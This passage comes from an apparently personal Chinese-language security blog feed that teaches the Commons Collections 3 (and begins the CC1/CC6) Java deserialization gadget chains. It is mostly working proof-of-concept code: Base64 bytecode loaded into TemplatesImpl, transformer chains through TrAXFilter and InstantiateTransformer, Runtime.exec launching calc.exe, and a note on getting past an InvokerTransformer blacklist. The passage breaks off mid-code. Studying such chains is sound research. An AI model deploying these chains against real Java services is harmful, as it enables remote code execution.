    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p><code>TemplatesImpl</code>是一个可以加载字节码的类，通过调用<code>newTransformer()</code>方法，即可执行这段字节码的类构造器，那么尝试再反序列化中利用这个特性执行任意代码</p><p>利用TemplatesImpl执行字节码的办法是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        obj.newTransformer();<span class="hljs-comment">//调用newTransformer来触发漏洞</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而下面是CC1利用<code>transformMap</code>执行任意方法的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结合这两段poc，可以改造出执行任意字节码的CC利用链，只需要改变第二个demo中的<code>InvokerTranformer</code>的方法改为<code>newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这里改为newTransformer的意义</p><p>通过创建一个名为InvokerTransformer的对象并调用其中的“newTransformer()”方法，可以生成一个能够执行Transformer对象的实例</p><p>这个方法将返回一个新的Transformer对象，它可以对输入的XML文档进行转换。这个新的Transformer对象被用来作为恶意代码中的常量，用于构建一个Transformer[]数组。</p></blockquote><p>改造后如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span>  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(obj),<br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)<br> &#125;;<br> <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br><span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237794.png" alt="image-20230216213233419"> </p><p>但现在的代码和CC3仍然不同，CC3没有用到<code>InvokerTransformer</code></p><p>因为<code>InvokerTransformer</code>被某种工具加入了黑名单，所以我们不能够使用这个方法，而是应该用到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p><p>这个类中调用了<code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使⽤<code>InvokerTransformer</code>⼿⼯调⽤ <code>newTransformer()</code> ⽅法这⼀步</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191237189.png" alt="image-20230217162413033"> </p><p>但很明显我们无法调用构造方法，总不能实例化一个对象去调用吧，于是我们使用<code>org.apache.commons.collections.functors.InstantiateTransformer</code>这个类，它实现了Transformer接口，作用是调用构造方法</p><p>于是利用链有了</p><p>利用<code>InstantiateTransformer</code>调用<code>TrAXFilter</code>的构造方法，再利用构造方法里面的<code>templates.newTransformer</code>调用<code>TemplatesImpl</code>里面的字节码</p><p>于是我们的利用链是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="hljs-comment">// 创建一个 ConstantTransformer，将 TrAXFilter 类作为常量值传递</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<span class="hljs-comment">// 创建一个 InstantiateTransformer，用于实例化 TemplatesImpl 对象,如此一来就可以调用构造方法来调用transform方法了</span><br>&#125;;<br>        &#125;;<br></code></pre></td></tr></table></figure><p>替换到前面的demo中，发现成功运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">byte</span>[] code =Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但这样还是存在和CC1一样的问题，只能用java8u71以前的版本</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC1&amp;6</title>
    <link href="/Decemberus.github-io/2022/11/03/CC1%E4%B8%8ECC6(1)/"/>
    <url>/Decemberus.github-io/2022/11/03/CC1%E4%B8%8ECC6(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Common-Collections1-amp-6"><a href="#Common-Collections1-amp-6" class="headerlink" title="Common-Collections1&amp;6"></a>Common-Collections1&amp;6</h1><p>这里Common-Collections就不用yso官方的了，用p神的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections1_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;C:/Windows/System32/calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>,<br>            transformerChain);<br>        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;xxxx&quot;</span>);<br>  